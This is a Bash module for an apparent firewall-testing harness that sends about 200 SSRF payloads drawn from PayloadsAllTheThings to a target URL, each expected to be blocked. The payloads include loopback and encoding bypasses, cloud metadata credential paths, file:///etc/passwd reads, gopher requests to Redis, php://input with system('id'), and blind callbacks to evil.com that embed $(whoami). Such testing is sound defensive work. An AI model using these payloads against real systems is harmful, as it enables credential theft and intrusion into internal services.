#!/bin/bash
#==============================================================================
# SSRF Tester - Script especializado em testes de Server-Side Request Forgery
# Versão: 1.0.0
# Descrição: Script modular para testes de SSRF usando payloads do PayloadsAllTheThings
#==============================================================================

# Importar cores e variáveis (se chamado diretamente)
if [ -z "$RED" ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    BOLD='\033[1m'
    NC='\033[0m'
fi

# Diretório base do script
SSRF_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SSRF_PAYLOADS_DIR="${SSRF_SCRIPT_DIR}/PayloadsAllTheThings/Server Side Request Forgery"

#==============================================================================
# FUNÇÕES AUXILIARES
#==============================================================================

ssrf_print_section() {
    local title="$1"
    local shortcut="$2"
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ -n "$shortcut" ]; then
        echo -e "${BOLD}${MAGENTA}$title ${CYAN}($shortcut)${NC}"
    else
        echo -e "${BOLD}${MAGENTA}$title${NC}"
    fi
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

ssrf_print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TESTES SSRF BÁSICO - Localhost e 127.0.0.1
#==============================================================================
test_ssrf_basic() {
    ssrf_print_subsection "SSRF Básico - Localhost (25 variações)"
    
    # Localhost básico
    test_curl "SSRF: localhost" "block" -A "$UA" -Lk "${URL}?url=http://localhost"
    test_curl "SSRF: localhost:80" "block" -A "$UA" -Lk "${URL}?url=http://localhost:80"
    test_curl "SSRF: localhost:22" "block" -A "$UA" -Lk "${URL}?url=http://localhost:22"
    test_curl "SSRF: localhost:443" "block" -A "$UA" -Lk "${URL}?url=https://localhost:443"
    test_curl "SSRF: localhost:3306" "block" -A "$UA" -Lk "${URL}?url=http://localhost:3306"
    
    # 127.0.0.1
    test_curl "SSRF: 127.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1"
    test_curl "SSRF: 127.0.0.1:80" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:80"
    test_curl "SSRF: 127.0.0.1:22" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:22"
    test_curl "SSRF: 127.0.0.1:443" "block" -A "$UA" -Lk "${URL}?url=https://127.0.0.1:443"
    test_curl "SSRF: 127.0.0.1:6379" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:6379"
    
    # 0.0.0.0
    test_curl "SSRF: 0.0.0.0" "block" -A "$UA" -Lk "${URL}?url=http://0.0.0.0"
    test_curl "SSRF: 0.0.0.0:80" "block" -A "$UA" -Lk "${URL}?url=http://0.0.0.0:80"
    test_curl "SSRF: 0.0.0.0:22" "block" -A "$UA" -Lk "${URL}?url=http://0.0.0.0:22"
    
    # Localhost variations
    test_curl "SSRF: localtest.me" "block" -A "$UA" -Lk "${URL}?url=http://localtest.me"
    test_curl "SSRF: localh.st" "block" -A "$UA" -Lk "${URL}?url=http://localh.st"
    
    # Private network
    test_curl "SSRF: 192.168.0.1" "block" -A "$UA" -Lk "${URL}?url=http://192.168.0.1"
    test_curl "SSRF: 192.168.1.1" "block" -A "$UA" -Lk "${URL}?url=http://192.168.1.1"
    test_curl "SSRF: 10.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://10.0.0.1"
    test_curl "SSRF: 172.16.0.1" "block" -A "$UA" -Lk "${URL}?url=http://172.16.0.1"
    
    # Different parameters
    test_curl "SSRF: param dest" "block" -A "$UA" -Lk "${URL}?dest=http://127.0.0.1"
    test_curl "SSRF: param target" "block" -A "$UA" -Lk "${URL}?target=http://127.0.0.1"
    test_curl "SSRF: param redirect" "block" -A "$UA" -Lk "${URL}?redirect=http://127.0.0.1"
    test_curl "SSRF: param uri" "block" -A "$UA" -Lk "${URL}?uri=http://127.0.0.1"
    test_curl "SSRF: param path" "block" -A "$UA" -Lk "${URL}?path=http://127.0.0.1"
    test_curl "SSRF: param continue" "block" -A "$UA" -Lk "${URL}?continue=http://127.0.0.1"
}

#==============================================================================
# TESTES SSRF BYPASS - IPv6, Encoding, CIDR
#==============================================================================
test_ssrf_bypass() {
    ssrf_print_subsection "SSRF Bypass Techniques (50 variações)"
    
    # IPv6 bypass
    test_curl "SSRF Bypass: IPv6 [::]:80" "block" -A "$UA" -Lk "${URL}?url=http://[::]:80/"
    test_curl "SSRF Bypass: IPv6 [0000::1]" "block" -A "$UA" -Lk "${URL}?url=http://[0000::1]:80/"
    test_curl "SSRF Bypass: IPv6 [::1]" "block" -A "$UA" -Lk "${URL}?url=http://[::1]:80/"
    test_curl "SSRF Bypass: IPv6 embed [::ffff:127.0.0.1]" "block" -A "$UA" -Lk "${URL}?url=http://[::ffff:127.0.0.1]"
    test_curl "SSRF Bypass: IPv6 embed [0:0:0:0:0:ffff:127.0.0.1]" "block" -A "$UA" -Lk "${URL}?url=http://[0:0:0:0:0:ffff:127.0.0.1]"
    test_curl "SSRF Bypass: ip6-localhost" "block" -A "$UA" -Lk "${URL}?url=http://ip6-localhost"
    test_curl "SSRF Bypass: ip6-loopback" "block" -A "$UA" -Lk "${URL}?url=http://ip6-loopback"
    
    # CIDR bypass
    test_curl "SSRF Bypass: 127.127.127.127" "block" -A "$UA" -Lk "${URL}?url=http://127.127.127.127"
    test_curl "SSRF Bypass: 127.0.1.3" "block" -A "$UA" -Lk "${URL}?url=http://127.0.1.3"
    test_curl "SSRF Bypass: 127.0.0.0" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.0"
    
    # Rare address
    test_curl "SSRF Bypass: http://0/" "block" -A "$UA" -Lk "${URL}?url=http://0/"
    test_curl "SSRF Bypass: http://127.1" "block" -A "$UA" -Lk "${URL}?url=http://127.1"
    test_curl "SSRF Bypass: http://127.0.1" "block" -A "$UA" -Lk "${URL}?url=http://127.0.1"
    
    # Decimal IP
    test_curl "SSRF Bypass: Decimal 2130706433" "block" -A "$UA" -Lk "${URL}?url=http://2130706433/"
    test_curl "SSRF Bypass: Decimal 3232235521" "block" -A "$UA" -Lk "${URL}?url=http://3232235521/"
    test_curl "SSRF Bypass: Decimal 2852039166" "block" -A "$UA" -Lk "${URL}?url=http://2852039166/"
    
    # Octal IP
    test_curl "SSRF Bypass: Octal 0177.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://0177.0.0.1/"
    test_curl "SSRF Bypass: Octal o177.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://o177.0.0.1/"
    test_curl "SSRF Bypass: Octal 0o177.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://0o177.0.0.1/"
    test_curl "SSRF Bypass: Octal q177.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://q177.0.0.1/"
    
    # Hex IP
    test_curl "SSRF Bypass: Hex 0x7f000001" "block" -A "$UA" -Lk "${URL}?url=http://0x7f000001"
    test_curl "SSRF Bypass: Hex 0xc0a80101" "block" -A "$UA" -Lk "${URL}?url=http://0xc0a80101"
    test_curl "SSRF Bypass: Hex 0xa9fea9fe" "block" -A "$UA" -Lk "${URL}?url=http://0xa9fea9fe"
    
    # URL encoding
    test_curl "SSRF Bypass: URL encode /admin" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1/%61dmin"
    test_curl "SSRF Bypass: Double encode" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1/%2561dmin"
    
    # Enclosed alphanumeric (Unicode)
    test_curl "SSRF Bypass: Unicode ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ" "block" -A "$UA" -Lk "${URL}?url=http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ"
    
    # Domain redirects (nip.io)
    test_curl "SSRF Bypass: 127.0.0.1.nip.io" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1.nip.io"
    test_curl "SSRF Bypass: company.127.0.0.1.nip.io" "block" -A "$UA" -Lk "${URL}?url=http://company.127.0.0.1.nip.io"
    
    # URL parsing discrepancy
    test_curl "SSRF Bypass: URL parse 1" "block" -A "$UA" -Lk "${URL}?url=http://127.1.1.1:80\\\\@127.2.2.2:80/"
    test_curl "SSRF Bypass: URL parse 2" "block" -A "$UA" -Lk "${URL}?url=http://127.1.1.1:80\\\\@@127.2.2.2:80/"
    test_curl "SSRF Bypass: URL parse 3" "block" -A "$UA" -Lk "${URL}?url=http://127.1.1.1:80:\\\\@@127.2.2.2:80/"
    test_curl "SSRF Bypass: URL parse 4" "block" -A "$UA" -Lk "${URL}?url=http://127.1.1.1:80#\\\\@127.2.2.2:80/"
    test_curl "SSRF Bypass: URL parse 5" "block" -A "$UA" -Lk "${URL}?url=http:127.0.0.1/"
    
    # PHP filter_var bypass
    test_curl "SSRF Bypass: PHP test???test.com" "block" -A "$UA" -Lk "${URL}?url=http://test???test.com"
    test_curl "SSRF Bypass: PHP 0://evil" "block" -A "$UA" -Lk "${URL}?url=0://evil.com:80;http://google.com:80/"
    
    # JAR scheme
    test_curl "SSRF Bypass: jar:http" "block" -A "$UA" -Lk "${URL}?url=jar:http://127.0.0.1!/"
    test_curl "SSRF Bypass: jar:https" "block" -A "$UA" -Lk "${URL}?url=jar:https://127.0.0.1!/"
    test_curl "SSRF Bypass: jar:ftp" "block" -A "$UA" -Lk "${URL}?url=jar:ftp://127.0.0.1!/"
    
    # Mixed bypass
    test_curl "SSRF Bypass: Mixed 1" "block" -A "$UA" -Lk "${URL}?url=http://0x7f.0.0.1"
    test_curl "SSRF Bypass: Mixed 2" "block" -A "$UA" -Lk "${URL}?url=http://0177.0.0.1:80"
    test_curl "SSRF Bypass: Mixed 3" "block" -A "$UA" -Lk "${URL}?url=http://[::ffff:0x7f.0.0.1]"
    
    # Whitespace bypass
    test_curl "SSRF Bypass: Space" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1%20"
    test_curl "SSRF Bypass: Tab" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1%09"
    test_curl "SSRF Bypass: Newline" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1%0A"
    
    # Case variation
    test_curl "SSRF Bypass: LOCALHOST" "block" -A "$UA" -Lk "${URL}?url=http://LOCALHOST"
    test_curl "SSRF Bypass: LocAlHost" "block" -A "$UA" -Lk "${URL}?url=http://LocAlHost"
}

#==============================================================================
# TESTES SSRF CLOUD METADATA - AWS, GCP, Azure, DigitalOcean
#==============================================================================
test_ssrf_cloud_metadata() {
    ssrf_print_subsection "SSRF Cloud Metadata (30 variações)"
    
    # AWS EC2 Metadata
    test_curl "SSRF Cloud: AWS IMDSv1" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/meta-data/"
    test_curl "SSRF Cloud: AWS credentials" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    test_curl "SSRF Cloud: AWS hostname" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/meta-data/hostname"
    test_curl "SSRF Cloud: AWS user-data" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/user-data/"
    test_curl "SSRF Cloud: AWS dynamic" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/dynamic/instance-identity/"
    
    # AWS IMDSv2 (requires token, but test anyway)
    test_curl "SSRF Cloud: AWS IMDSv2 API" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/api/token"
    
    # Google Cloud Platform
    test_curl "SSRF Cloud: GCP metadata" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/computeMetadata/v1/"
    test_curl "SSRF Cloud: GCP 169.254.169.254" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/computeMetadata/v1/"
    test_curl "SSRF Cloud: GCP project" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"
    test_curl "SSRF Cloud: GCP service accounts" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
    test_curl "SSRF Cloud: GCP token" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    
    # Microsoft Azure
    test_curl "SSRF Cloud: Azure metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    test_curl "SSRF Cloud: Azure identity" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
    
    # DigitalOcean
    test_curl "SSRF Cloud: DO metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/v1/"
    test_curl "SSRF Cloud: DO id" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/v1/id"
    test_curl "SSRF Cloud: DO hostname" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/v1/hostname"
    test_curl "SSRF Cloud: DO user-data" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/v1/user-data"
    
    # Oracle Cloud
    test_curl "SSRF Cloud: Oracle metadata" "block" -A "$UA" -Lk "${URL}?url=http://192.0.0.192/latest/"
    test_curl "SSRF Cloud: Oracle user-data" "block" -A "$UA" -Lk "${URL}?url=http://192.0.0.192/latest/user-data/"
    
    # Alibaba Cloud
    test_curl "SSRF Cloud: Alibaba metadata" "block" -A "$UA" -Lk "${URL}?url=http://100.100.100.200/latest/meta-data/"
    
    # Kubernetes
    test_curl "SSRF Cloud: K8s serviceaccount" "block" -A "$UA" -Lk "${URL}?url=https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/"
    test_curl "SSRF Cloud: K8s token" "block" -A "$UA" -Lk "${URL}?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
    
    # Docker
    test_curl "SSRF Cloud: Docker socket" "block" -A "$UA" -Lk "${URL}?url=http://unix:/var/run/docker.sock:/containers/json"
    test_curl "SSRF Cloud: Docker API" "block" -A "$UA" -Lk "${URL}?url=http://localhost:2375/containers/json"
    
    # Cloud metadata bypass
    test_curl "SSRF Cloud: AWS bypass decimal" "block" -A "$UA" -Lk "${URL}?url=http://2852039166/latest/meta-data/"
    test_curl "SSRF Cloud: AWS bypass hex" "block" -A "$UA" -Lk "${URL}?url=http://0xa9fea9fe/latest/meta-data/"
    test_curl "SSRF Cloud: AWS bypass octal" "block" -A "$UA" -Lk "${URL}?url=http://0251.0376.0251.0376/latest/meta-data/"
    
    # Cloud with encoded
    test_curl "SSRF Cloud: AWS encoded" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/%6deta-data/"
    test_curl "SSRF Cloud: GCP encoded" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/computeMetadata/v1/%70roject/"
}

#==============================================================================
# TESTES SSRF URL SCHEMES - file://, dict://, gopher://, etc.
#==============================================================================
test_ssrf_url_schemes() {
    ssrf_print_subsection "SSRF URL Schemes (25 variações)"
    
    # file:// scheme
    test_curl "SSRF Scheme: file:///etc/passwd" "block" -A "$UA" -Lk "${URL}?url=file:///etc/passwd"
    test_curl "SSRF Scheme: file:////etc/passwd" "block" -A "$UA" -Lk "${URL}?url=file:////etc/passwd"
    test_curl "SSRF Scheme: file://localhost/etc/passwd" "block" -A "$UA" -Lk "${URL}?url=file://localhost/etc/passwd"
    test_curl "SSRF Scheme: file Windows C:" "block" -A "$UA" -Lk "${URL}?url=file:///C:/Windows/win.ini"
    
    # dict:// scheme
    test_curl "SSRF Scheme: dict://" "block" -A "$UA" -Lk "${URL}?url=dict://localhost:11211/stats"
    test_curl "SSRF Scheme: dict Redis" "block" -A "$UA" -Lk "${URL}?url=dict://localhost:6379/info"
    
    # gopher:// scheme
    test_curl "SSRF Scheme: gopher://" "block" -A "$UA" -Lk "${URL}?url=gopher://localhost:25/"
    test_curl "SSRF Scheme: gopher SMTP" "block" -A "$UA" -Lk "${URL}?url=gopher://localhost:25/_MAIL%20FROM"
    test_curl "SSRF Scheme: gopher Redis" "block" -A "$UA" -Lk "${URL}?url=gopher://localhost:6379/_INFO"
    
    # ldap:// scheme
    test_curl "SSRF Scheme: ldap://" "block" -A "$UA" -Lk "${URL}?url=ldap://localhost:389/"
    test_curl "SSRF Scheme: ldap query" "block" -A "$UA" -Lk "${URL}?url=ldap://localhost:11211/%0astats%0aquit"
    
    # sftp:// scheme
    test_curl "SSRF Scheme: sftp://" "block" -A "$UA" -Lk "${URL}?url=sftp://localhost:22/"
    test_curl "SSRF Scheme: sftp evil" "block" -A "$UA" -Lk "${URL}?url=sftp://evil.com:11111/"
    
    # tftp:// scheme
    test_curl "SSRF Scheme: tftp://" "block" -A "$UA" -Lk "${URL}?url=tftp://localhost:69/test"
    test_curl "SSRF Scheme: tftp UDP" "block" -A "$UA" -Lk "${URL}?url=tftp://evil.com:12346/TESTUDPPACKET"
    
    # ftp:// scheme
    test_curl "SSRF Scheme: ftp://" "block" -A "$UA" -Lk "${URL}?url=ftp://localhost/"
    test_curl "SSRF Scheme: ftp with creds" "block" -A "$UA" -Lk "${URL}?url=ftp://user:pass@localhost/"
    
    # netdoc:// scheme (Java)
    test_curl "SSRF Scheme: netdoc" "block" -A "$UA" -Lk "${URL}?url=netdoc:///etc/passwd"
    test_curl "SSRF Scheme: netdoc Windows" "block" -A "$UA" -Lk "${URL}?url=netdoc:///C:/Windows/win.ini"
    
    # jar:// scheme
    test_curl "SSRF Scheme: jar http" "block" -A "$UA" -Lk "${URL}?url=jar:http://localhost!/"
    test_curl "SSRF Scheme: jar file" "block" -A "$UA" -Lk "${URL}?url=jar:file:///etc/passwd!/"
    
    # expect:// scheme
    test_curl "SSRF Scheme: expect" "block" -A "$UA" -Lk "${URL}?url=expect://id"
    
    # php:// wrappers
    test_curl "SSRF Scheme: php://input" "block" -A "$UA" -Lk "${URL}?url=php://input" -d "<?php system('id'); ?>"
    test_curl "SSRF Scheme: php://filter" "block" -A "$UA" -Lk "${URL}?url=php://filter/convert.base64-encode/resource=/etc/passwd"
    
    # data:// scheme
    test_curl "SSRF Scheme: data://" "block" -A "$UA" -Lk "${URL}?url=data://text/plain,SSRF_TEST"
}

#==============================================================================
# TESTES SSRF INTERNAL SERVICES - Redis, MySQL, Memcached, etc.
#==============================================================================
test_ssrf_internal_services() {
    ssrf_print_subsection "SSRF Internal Services (20 variações)"
    
    # Redis
    test_curl "SSRF Service: Redis 6379" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:6379/"
    test_curl "SSRF Service: Redis INFO" "block" -A "$UA" -Lk "${URL}?url=dict://127.0.0.1:6379/INFO"
    test_curl "SSRF Service: Redis gopher" "block" -A "$UA" -Lk "${URL}?url=gopher://127.0.0.1:6379/_INFO"
    
    # MySQL
    test_curl "SSRF Service: MySQL 3306" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:3306/"
    test_curl "SSRF Service: MySQL gopher" "block" -A "$UA" -Lk "${URL}?url=gopher://127.0.0.1:3306/"
    
    # PostgreSQL
    test_curl "SSRF Service: PostgreSQL 5432" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:5432/"
    
    # MongoDB
    test_curl "SSRF Service: MongoDB 27017" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:27017/"
    test_curl "SSRF Service: MongoDB 28017" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:28017/"
    
    # Memcached
    test_curl "SSRF Service: Memcached 11211" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:11211/"
    test_curl "SSRF Service: Memcached dict" "block" -A "$UA" -Lk "${URL}?url=dict://127.0.0.1:11211/stats"
    
    # Elasticsearch
    test_curl "SSRF Service: Elasticsearch 9200" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:9200/"
    test_curl "SSRF Service: Elasticsearch _cat" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:9200/_cat/indices"
    
    # SMTP
    test_curl "SSRF Service: SMTP 25" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:25/"
    test_curl "SSRF Service: SMTP gopher" "block" -A "$UA" -Lk "${URL}?url=gopher://127.0.0.1:25/_EHLO"
    
    # Jenkins
    test_curl "SSRF Service: Jenkins 8080" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:8080/jenkins"
    
    # Docker
    test_curl "SSRF Service: Docker 2375" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:2375/containers/json"
    test_curl "SSRF Service: Docker 2376" "block" -A "$UA" -Lk "${URL}?url=https://127.0.0.1:2376/containers/json"
    
    # Kubernetes
    test_curl "SSRF Service: K8s 8001" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:8001/api/"
    test_curl "SSRF Service: K8s 10250" "block" -A "$UA" -Lk "${URL}?url=https://127.0.0.1:10250/pods"
    
    # Apache Tomcat
    test_curl "SSRF Service: Tomcat 8080" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:8080/manager/html"
}

#==============================================================================
# TESTES SSRF BLIND - Out-of-Band detection
#==============================================================================
test_ssrf_blind() {
    ssrf_print_subsection "SSRF Blind / Out-of-Band (15 variações)"
    
    local collab_domain="burp.oastify.com"
    local evil_domain="evil.com"
    
    # DNS exfiltration
    test_curl "SSRF Blind: DNS lookup" "block" -A "$UA" -Lk "${URL}?url=http://ssrf-test.${collab_domain}"
    test_curl "SSRF Blind: DNS subdomain" "block" -A "$UA" -Lk "${URL}?url=http://\\\$(whoami).${collab_domain}"
    
    # HTTP callback
    test_curl "SSRF Blind: HTTP callback" "block" -A "$UA" -Lk "${URL}?url=http://${evil_domain}/ssrf-callback"
    test_curl "SSRF Blind: HTTP with path" "block" -A "$UA" -Lk "${URL}?url=http://${evil_domain}/\\\$(id)"
    
    # Time-based detection
    test_curl "SSRF Blind: Time-based 1" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1:9999"
    test_curl "SSRF Blind: Time-based 2" "block" -A "$UA" -Lk "${URL}?url=http://192.168.255.255:80"
    
    # SVG SSRF to XSS
    test_curl "SSRF Blind: SVG XSS" "block" -A "$UA" -Lk "${URL}?url=http://brutelogic.com.br/poc.svg"
    
    # Webhooks
    test_curl "SSRF Blind: Webhook" "block" -A "$UA" -Lk "${URL}?webhook=http://${evil_domain}/hook"
    
    # PDF generators
    test_curl "SSRF Blind: PDF gen" "block" -A "$UA" -Lk "${URL}?pdf_url=http://127.0.0.1/"
    
    # Image processing
    test_curl "SSRF Blind: Image URL" "block" -A "$UA" -Lk "${URL}?image=http://127.0.0.1/secret.png"
    test_curl "SSRF Blind: Avatar URL" "block" -A "$UA" -Lk "${URL}?avatar=http://169.254.169.254/"
    
    # Redirects
    test_curl "SSRF Blind: 307 redirect" "block" -A "$UA" -Lk "${URL}?url=https://307.r3dir.me/--to/?url=http://localhost"
    test_curl "SSRF Blind: 302 redirect" "block" -A "$UA" -Lk "${URL}?url=http://redirect.${collab_domain}/?target=http://127.0.0.1"
    
    # DNS rebinding
    test_curl "SSRF Blind: DNS rebind" "block" -A "$UA" -Lk "${URL}?url=http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms"
    
    # HTTPS to HTTP
    test_curl "SSRF Blind: HTTPS downgrade" "block" -A "$UA" -Lk "${URL}?url=https://127.0.0.1:80/"
}

#==============================================================================
# FUNÇÃO PRINCIPAL - Executa todos os testes SSRF
#==============================================================================
run_all_ssrf_tests() {
    ssrf_print_section "🌐 TESTES COMPLETOS DE SSRF (PayloadsAllTheThings)" "-c ssrf"
    
    echo -e "${CYAN}ℹ️  Usando payloads do PayloadsAllTheThings/Server Side Request Forgery${NC}"
    echo -e "${CYAN}ℹ️  Total estimado: 200+ testes de SSRF${NC}"
    echo ""
    
    test_ssrf_basic
    test_ssrf_bypass
    test_ssrf_cloud_metadata
    test_ssrf_url_schemes
    test_ssrf_internal_services
    test_ssrf_blind
    
    echo ""
    echo -e "${GREEN}✓ Todos os testes SSRF foram concluídos!${NC}"
}

# Se o script for executado diretamente (não como source)
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    echo -e "${RED}❌ Este script deve ser chamado pelo head-test.sh${NC}"
    echo -e "${YELLOW}Use: ./head-test.sh -u URL -c ssrf${NC}"
    exit 1
fi
